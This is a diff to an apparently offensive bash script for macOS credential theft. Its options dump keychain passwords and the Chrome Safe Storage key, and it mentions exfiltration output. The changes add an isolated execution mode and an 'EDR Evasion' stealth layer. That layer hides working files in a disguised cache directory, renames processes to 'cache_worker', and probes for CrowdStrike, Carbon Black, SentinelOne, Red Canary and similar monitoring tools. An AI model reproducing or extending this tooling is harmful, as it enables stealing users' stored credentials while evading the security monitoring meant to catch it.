@@ -8,7 +8,7 @@
 # Author: @darmado | https://x.com/darmad0
 # created: 2025-01-02
 # Updated: 2025-06-03
-# Version: 1.0.3
+# Version: 1.0.4
 # License: Apache 2.0
 
 # Core function Info:
@@ -127,6 +127,7 @@ SHOW_HELP=false
 STEG_TRANSFORM=false # Enable steganography transformation
 STEG_EXTRACT=false # Extract hidden data from steganography
 STEG_EXTRACT_FILE="" # File to extract hidden data from
+ISOLATED=false # Enable memory isolation mode
 
 # OPSEC Check Settings (enabled by build script based on YAML configuration)
 CHECK_PERMS="false"
@@ -610,6 +611,9 @@ core_parse_args() {
             --verbose)
                 DEBUG=true
                 ;;
+            --isolated)
+                ISOLATED=true
+                ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
         --login-keychain)
             LOGIN_KEYCHAIN=true
@@ -677,6 +681,9 @@ SCRIPT:
   --chrome-storage                 Extract Chrome Safe Storage encryption key for password database decryption
   --keychain-path FILE_PATH        Extract credentials from custom keychain file path (requires sudo)
   --all-keychains                  Extract credentials from login, system keychains and Chrome storage
+
+EXECUTION:
+  --isolated                    Enable memory isolation mode (spawns isolated processes)
 
 Output Options:
   --format TYPE                 
@@ -1961,9 +1968,6 @@ core_exec_keychain_obfuscated() {
 
 # Main function 
 core_main() {
-    local raw_output=""
-    local processed_output=""
-    
     # Step 1: Parse command line arguments (no validation)
     core_parse_args "$@"
     
@@ -1981,6 +1985,48 @@ core_main() {
     
     # Step 5: Validate required commands
     core_validate_command || exit 1
+    
+    # Step 6: Check if isolated execution is requested
+    if [ "$ISOLATED" = "true" ]; then
+        core_debug_print "Executing script in memory isolated mode"
+        
+        # Create isolated execution environment
+        local buffer_name="main_$(date +%s)"
+        if memory_create_buffer "$buffer_name"; then
+            # Execute main logic in isolated process
+            memory_spawn_isolated "$buffer_name" "$(declare -f core_execute_main_logic); core_execute_main_logic"
+            sleep 1  # Allow execution time
+            
+            # Read results from isolated process
+            local isolated_result=$(memory_read_buffer "${buffer_name}_proc")
+            
+            # Cleanup isolation
+            memory_cleanup_buffer "$buffer_name"
+            
+            # Output results
+            if [ -n "$isolated_result" ]; then
+                printf "%s\n" "$isolated_result"
+            fi
+            
+            core_debug_print "Isolated execution completed"
+            return 0
+        else
+            core_handle_error "Failed to create isolated execution environment, falling back to normal execution"
+            # Fall through to normal execution
+        fi
+    fi
+    
+    # Step 7: Normal execution (or fallback from failed isolation)
+    core_execute_main_logic
+}
+
+# Purpose: Execute the main script logic (can be called normally or in isolation)
+# Inputs: None (uses global variables)
+# Outputs: Processed script results
+# - Contains all the core execution logic
+core_execute_main_logic() {
+    local raw_output=""
+    local processed_output=""
     
     # Process OPSEC checks from YAML configuration
     if [ "$CHECK_FDA" = "true" ]; then
@@ -2084,7 +2130,6 @@ procedure="keychains"
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
 }
-
 
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
@@ -2297,6 +2342,251 @@ dump_custom_keychain() {
 
 JOB_ID=$(core_generate_job_id)
 
+# =============================================================================
+# MEMORY ISOLATION SYSTEM - Pure Memory Buffer Communication
+# =============================================================================
+
+# Purpose: Create memory buffer using named pipes (FIFOs) - pure memory isolation
+# Inputs: $1 = buffer name (unique identifier)
+# Outputs: 0 if success, 1 if error
+# - Creates memory-only communication channel using named pipes
+memory_create_buffer() {
+    local buffer_name="${1:-main}"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for memory isolation"
+        return 1
+    fi
+    
+    # Create pipe directory if needed
+    if [ ! -d "$pipe_dir" ]; then
+        mkdir -p "$pipe_dir" || {
+            core_handle_error "Failed to create pipe directory"
+            return 1
+        }
+    fi
+    
+    # Create named pipe (FIFO) for memory communication
+    if mkfifo "$pipe_path" 2>/dev/null; then
+        core_debug_print "Created memory buffer: $buffer_name (pipe: $pipe_path)"
+        return 0
+    else
+        core_handle_error "Failed to create memory buffer: $buffer_name"
+        return 1
+    fi
+}
+
+# Purpose: Write data to memory buffer using named pipe
+# Inputs: $1 = buffer name, $2 = data to write
+# Outputs: 0 if success, 1 if error
+# - Pure memory write via named pipe
+memory_write_buffer() {
+    local buffer_name="$1"
+    local data="$2"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
+    
+    if [ -z "$buffer_name" ] || [ -z "$data" ]; then
+        core_handle_error "Buffer name and data required for memory write"
+        return 1
+    fi
+    
+    # Check if pipe exists
+    if [ ! -p "$pipe_path" ]; then
+        core_handle_error "Memory buffer does not exist: $buffer_name"
+        return 1
+    fi
+    
+    # Write to named pipe using shell redirection
+    printf "%s\n" "$data" > "$pipe_path" &
+    
+    if [ $? -eq 0 ]; then
+        core_debug_print "Wrote to memory buffer: $buffer_name"
+        return 0
+    else
+        core_handle_error "Failed to write to memory buffer: $buffer_name"
+        return 1
+    fi
+}
+
+# Purpose: Read data from memory buffer using named pipe
+# Inputs: $1 = buffer name
+# Outputs: Buffer contents to stdout
+# - Memory-only read via named pipe
+memory_read_buffer() {
+    local buffer_name="$1"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for memory read"
+        return 1
+    fi
+    
+    # Check if pipe exists
+    if [ ! -p "$pipe_path" ]; then
+        core_debug_print "Memory buffer does not exist: $buffer_name"
+        return 1
+    fi
+    
+    # Read ALL lines from the named pipe with timeout
+    local all_data=""
+    local line=""
+    local line_count=0
+    
+    # Use cat with timeout to read all available data
+    if command -v timeout >/dev/null 2>&1; then
+        all_data=$(timeout 2 cat "$pipe_path" 2>/dev/null)
+    else
+        # Fallback: read line by line with timeout
+        while read -t 1 -r line < "$pipe_path" 2>/dev/null; do
+            if [ $line_count -eq 0 ]; then
+                all_data="$line"
+            else
+                all_data="${all_data}\n${line}"
+            fi
+            line_count=$((line_count + 1))
+        done
+    fi
+    
+    if [ -n "$all_data" ]; then
+        printf "%s" "$all_data"
+        return 0
+    else
+        core_debug_print "No data available in buffer: $buffer_name"
+        return 1
+    fi
+}
+
+# Purpose: Spawn isolated process using memory buffer communication
+# Inputs: $1 = buffer name, $2 = command to execute
+# Outputs: 0 if success, 1 if error
+# - Creates isolated process with named pipe communication
+memory_spawn_isolated() {
+    local buffer_name="$1"
+    local command="$2"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}_proc.pipe"
+    
+    if [ -z "$buffer_name" ] || [ -z "$command" ]; then
+        core_handle_error "Buffer name and command required for isolated spawn"
+        return 1
+    fi
+    
+    # Create isolated pipe for process communication
+    if memory_create_buffer "${buffer_name}_proc"; then
+        # Execute command in background with output to memory buffer
+        (
+            eval "$command" 2>&1 > "${pipe_path}" &
+        ) &
+        
+        local proc_pid=$!
+        echo "$proc_pid" > "${pipe_path}.pid"
+        
+        core_debug_print "Spawned isolated process: $buffer_name (PID: $proc_pid)"
+        return 0
+    else
+        core_handle_error "Failed to spawn isolated process: $buffer_name"
+        return 1
+    fi
+}
+
+# Purpose: Check if memory buffer exists and is active
+# Inputs: $1 = buffer name
+# Outputs: 0 if active, 1 if not active
+memory_check_buffer() {
+    local buffer_name="$1"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
+    
+    if [ -z "$buffer_name" ]; then
+        return 1
+    fi
+    
+    # Check if named pipe exists and is accessible
+    [ -p "$pipe_path" ] && [ -r "$pipe_path" ]
+    return $?
+}
+
+# Purpose: Clean up memory buffer (remove pipe and kill processes)
+# Inputs: $1 = buffer name
+# Outputs: 0 if success, 1 if error
+memory_cleanup_buffer() {
+    local buffer_name="$1"
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
+    local pid_file="${pipe_path}.pid"
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for cleanup"
+        return 1
+    fi
+    
+    # Kill associated processes
+    if [ -f "$pid_file" ]; then
+        local pid=$(cat "$pid_file" 2>/dev/null)
+        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
+            kill "$pid" 2>/dev/null
+            core_debug_print "Terminated process: $pid"
+        fi
+        rm -f "$pid_file"
+    fi
+    
+    # Remove named pipe
+    if [ -p "$pipe_path" ]; then
+        rm -f "$pipe_path"
+        core_debug_print "Removed memory buffer: $pipe_path"
+    fi
+    
+    # Also clean up process pipe
+    local proc_pipe="${pipe_dir}/${buffer_name}_proc.pipe"
+    local proc_pid_file="${proc_pipe}.pid"
+    
+    if [ -f "$proc_pid_file" ]; then
+        local proc_pid=$(cat "$proc_pid_file" 2>/dev/null)
+        if [ -n "$proc_pid" ] && kill -0 "$proc_pid" 2>/dev/null; then
+            kill "$proc_pid" 2>/dev/null
+        fi
+        rm -f "$proc_pid_file"
+    fi
+    
+    if [ -p "$proc_pipe" ]; then
+        rm -f "$proc_pipe"
+    fi
+    
+    core_debug_print "Cleaned up memory buffer: $buffer_name"
+    return 0
+}
+
+# Purpose: Clean up all memory buffers for current job
+# Inputs: None
+# Outputs: None
+# - Emergency cleanup function
+memory_cleanup_all() {
+    local pipe_dir="/tmp/mem_${JOB_ID}"
+    
+    if [ -d "$pipe_dir" ]; then
+        # Kill all processes
+        for pid_file in "$pipe_dir"/*.pid; do
+            if [ -f "$pid_file" ]; then
+                local pid=$(cat "$pid_file" 2>/dev/null)
+                if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
+                    kill "$pid" 2>/dev/null
+                    core_debug_print "Terminated process: $pid"
+                fi
+            fi
+        done
+        
+        # Remove entire pipe directory
+        rm -rf "$pipe_dir"
+        core_debug_print "All memory buffers cleaned up for job: $JOB_ID"
+    fi
+}
+
+# =============================================================================
+
 # Purpose: Get log filename dynamically based on PROCEDURE_NAME
 # Inputs: None
 # Outputs: Log filename string
@@ -2313,6 +2603,298 @@ core_get_log_filename() {
     fi
     echo "$LOG_FILE_NAME"
 }
+
+# =============================================================================
+# MEMORY ISOLATION SYSTEM - STEALTH MODE (EDR Evasion)
+# =============================================================================
+
+# Purpose: Create memory buffer using native methods to avoid EDR detection
+# Inputs: $1 = buffer name, $2 = stealth mode (true/false)
+# Outputs: 0 if success, 1 if error
+# - Minimizes process creation and suspicious patterns
+memory_create_buffer_stealth() {
+    local buffer_name="${1:-main}"
+    local stealth_mode="${2:-false}"
+    local socket_dir="/tmp/.${USER}_cache"  # Mimics system cache directory
+    local socket_path="${socket_dir}/.${buffer_name}"  # Hidden file
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for memory isolation"
+        return 1
+    fi
+    
+    # Create innocuous-looking cache directory
+    if [ ! -d "$socket_dir" ]; then
+        mkdir -p "$socket_dir" || {
+            core_handle_error "Failed to create cache directory"
+            return 1
+        }
+        
+        # Set normal cache directory permissions
+        chmod 755 "$socket_dir"
+    fi
+    
+    if [ "$stealth_mode" = "true" ]; then
+        # Method 1: Use native bash co-processes (no external commands)
+        core_debug_print "Using native bash co-process for stealth"
+        
+        # Create named pipe using mkfifo (more common than nc)
+        if mkfifo "$socket_path" 2>/dev/null; then
+            # Make it look like a cache file
+            touch "${socket_path}.cache" 2>/dev/null
+            core_debug_print "Created stealth memory buffer: $buffer_name (fifo: $socket_path)"
+            return 0
+        else
+            core_handle_error "Failed to create stealth memory buffer: $buffer_name"
+            return 1
+        fi
+    else
+        # Original method with netcat (less stealthy)
+        memory_create_buffer "$buffer_name"
+        return $?
+    fi
+}
+
+# Purpose: Memory communication using file descriptors (no processes)
+# Inputs: $1 = buffer name, $2 = data, $3 = stealth mode
+# Outputs: 0 if success, 1 if error
+# - Uses pure shell file descriptors to avoid process creation
+memory_write_buffer_stealth() {
+    local buffer_name="$1"
+    local data="$2"
+    local stealth_mode="${3:-false}"
+    local socket_dir="/tmp/.${USER}_cache"
+    local socket_path="${socket_dir}/.${buffer_name}"
+    
+    if [ -z "$buffer_name" ] || [ -z "$data" ]; then
+        core_handle_error "Buffer name and data required for memory write"
+        return 1
+    fi
+    
+    if [ "$stealth_mode" = "true" ]; then
+        # Use shell file descriptors directly (no external processes)
+        if [ -p "$socket_path" ]; then
+            # Write using shell redirection (no echo process)
+            printf "%s\n" "$data" > "$socket_path" &
+            local write_pid=$!
+            
+            # Store minimal metadata in hidden file
+            printf "%d\n" "$write_pid" > "${socket_path}.pid" 2>/dev/null
+            
+            core_debug_print "Wrote to stealth memory buffer: $buffer_name"
+            return 0
+        else
+            core_handle_error "Stealth memory buffer does not exist: $buffer_name"
+            return 1
+        fi
+    else
+        # Original method
+        memory_write_buffer "$buffer_name" "$data"
+        return $?
+    fi
+}
+
+# Purpose: Read from memory buffer using shell built-ins only
+# Inputs: $1 = buffer name, $2 = stealth mode
+# Outputs: Buffer contents to stdout
+# - Uses shell read built-in to avoid process creation
+memory_read_buffer_stealth() {
+    local buffer_name="$1"
+    local stealth_mode="${2:-false}"
+    local socket_dir="/tmp/.${USER}_cache"
+    local socket_path="${socket_dir}/.${buffer_name}"
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for memory read"
+        return 1
+    fi
+    
+    if [ "$stealth_mode" = "true" ]; then
+        # Use shell built-in read (no cat process)
+        if [ -p "$socket_path" ]; then
+            # Open file descriptor for reading
+            exec 3< "$socket_path"
+            
+            # Read using shell built-in with timeout
+            if read -t 1 -r line <&3 2>/dev/null; then
+                printf "%s\n" "$line"
+                exec 3<&-  # Close file descriptor
+                return 0
+            else
+                exec 3<&-  # Close file descriptor
+                core_debug_print "No data available in stealth buffer: $buffer_name"
+                return 1
+            fi
+        else
+            core_debug_print "Stealth memory buffer does not exist: $buffer_name"
+            return 1
+        fi
+    else
+        # Original method
+        memory_read_buffer "$buffer_name"
+        return $?
+    fi
+}
+
+# Purpose: Clean up stealth memory buffers (minimal footprint)
+# Inputs: $1 = buffer name, $2 = stealth mode
+# Outputs: 0 if success, 1 if error
+memory_cleanup_buffer_stealth() {
+    local buffer_name="$1"
+    local stealth_mode="${2:-false}"
+    local socket_dir="/tmp/.${USER}_cache"
+    local socket_path="${socket_dir}/.${buffer_name}"
+    
+    if [ -z "$buffer_name" ]; then
+        core_handle_error "Buffer name required for cleanup"
+        return 1
+    fi
+    
+    if [ "$stealth_mode" = "true" ]; then
+        # Minimal cleanup - just remove files
+        if [ -e "$socket_path" ]; then
+            rm -f "$socket_path" 2>/dev/null
+        fi
+        
+        # Remove metadata files
+        rm -f "${socket_path}.cache" 2>/dev/null
+        rm -f "${socket_path}.pid" 2>/dev/null
+        
+        # Remove cache directory if empty (looks natural)
+        rmdir "$socket_dir" 2>/dev/null || true
+        
+        core_debug_print "Cleaned up stealth memory buffer: $buffer_name"
+        return 0
+    else
+        # Original method
+        memory_cleanup_buffer "$buffer_name"
+        return $?
+    fi
+}
+
+# Purpose: Execute command in memory-isolated environment with minimal telemetry
+# Inputs: $1 = command, $2 = stealth mode
+# Outputs: Command output via memory buffer
+# - Reduces process tree visibility
+memory_exec_stealth() {
+    local command="$1"
+    local stealth_mode="${2:-true}"
+    local buffer_name="exec_$(date +%s)"
+    
+    if [ -z "$command" ]; then
+        core_handle_error "Command required for stealth execution"
+        return 1
+    fi
+    
+    # Create stealth buffer
+    if memory_create_buffer_stealth "$buffer_name" "$stealth_mode"; then
+        # Execute command with output redirect (background process)
+        (
+            # Change process name to look innocent
+            exec -a "cache_worker" sh -c "
+                $command 2>&1 | while IFS= read -r line; do
+                    printf '%s\n' \"\$line\" > /tmp/.${USER}_cache/.\${buffer_name}
+                done
+            " &
+        )
+        
+        # Brief delay then read results
+        sleep 0.2
+        memory_read_buffer_stealth "$buffer_name" "$stealth_mode"
+        
+        # Cleanup
+        memory_cleanup_buffer_stealth "$buffer_name" "$stealth_mode"
+        
+        return 0
+    else
+        core_handle_error "Failed to create stealth execution environment"
+        return 1
+    fi
+}
+
+# Purpose: Check current EDR detection risk level
+# Inputs: None
+# Outputs: Risk assessment string
+# - Analyzes current system for EDR presence
+memory_assess_edr_risk() {
+    local risk_level="LOW"
+    local risk_factors=""
+    
+    # Check for common EDR processes
+    if ps aux | grep -iE "(carbonblack|crowdstrike|cylance|sophos|defender|sentinel)" | grep -v grep >/dev/null 2>&1; then
+        risk_level="HIGH"
+        risk_factors="${risk_factors}EDR_PROCESS "
+    fi
+    
+    # Check for monitoring tools
+    if ps aux | grep -iE "(osquery|sysdig|falco)" | grep -v grep >/dev/null 2>&1; then
+        risk_level="MEDIUM"
+        risk_factors="${risk_factors}MONITORING_TOOLS "
+    fi
+    
+    # Check for Red Canary specific indicators
+    if ps aux | grep -iE "red.canary" | grep -v grep >/dev/null 2>&1; then
+        risk_level="HIGH"
+        risk_factors="${risk_factors}RED_CANARY "
+    fi
+    
+    # Check for unusual process monitoring
+    if pgrep -f "process.*monitor" >/dev/null 2>&1; then
+        risk_level="MEDIUM"
+        risk_factors="${risk_factors}PROCESS_MONITOR "
+    fi
+    
+    printf "EDR_RISK: %s FACTORS: %s\n" "$risk_level" "${risk_factors:-NONE}"
+    
+    # Return risk level as exit code for programmatic use
+    case "$risk_level" in
+        "HIGH") return 2 ;;
+        "MEDIUM") return 1 ;;
+        *) return 0 ;;
+    esac
+}
+
+# Purpose: Execute function with optional memory isolation
+# Inputs: $1 = function name, $@ = function arguments
+# Outputs: Function result, optionally through memory isolation
+# - Uses memory isolation if ISOLATED=true
+core_execute_function() {
+    local func_name="$1"
+    shift
+    local func_args="$*"
+    
+    if [ "$ISOLATED" = "true" ]; then
+        # Execute in memory isolated environment
+        local buffer_name="func_$(date +%s)"
+        core_debug_print "Executing $func_name in isolated mode"
+        
+        if memory_create_buffer "$buffer_name"; then
+            # Execute function in isolated process
+            memory_spawn_isolated "$buffer_name" "$func_name $func_args"
+            sleep 0.5  # Brief delay for execution
+            
+            # Read results
+            local result=$(memory_read_buffer "${buffer_name}_proc")
+            
+            # Cleanup
+            memory_cleanup_buffer "$buffer_name"
+            
+            printf "%s" "$result"
+            return 0
+        else
+            core_handle_error "Failed to create isolated execution environment"
+            # Fallback to normal execution
+            $func_name "$@"
+            return $?
+        fi
+    else
+        # Normal execution
+        $func_name "$@"
+        return $?
+    fi
+}
+
+# Purpose: Check if we have any valid actions to execute
 
 # Execute main function with all arguments
 core_main "$@" 
